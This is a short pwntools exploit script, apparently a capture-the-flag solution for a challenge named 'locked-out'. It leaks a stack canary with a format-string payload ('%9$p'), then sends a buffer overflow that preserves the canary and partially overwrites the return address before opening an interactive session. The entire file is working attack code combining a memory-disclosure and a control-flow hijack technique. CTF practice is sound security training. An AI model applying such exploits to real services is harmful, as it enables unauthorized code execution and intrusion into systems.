from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'locked-out-f2f7aee547c484bb-global.challs.brunnerne.xyz', 1337
r = remote(HOST, PORT, ssl=True)

r.sendlineafter(b': ', '%9$p'.encode() + b'AAAA')
canary = int(r.recvuntil(b' ').strip().decode(),16)
r.sendafter(b': ', b'A'*8+p32(1)+p64(canary)+p64(0)+b'\xda')

r.interactive()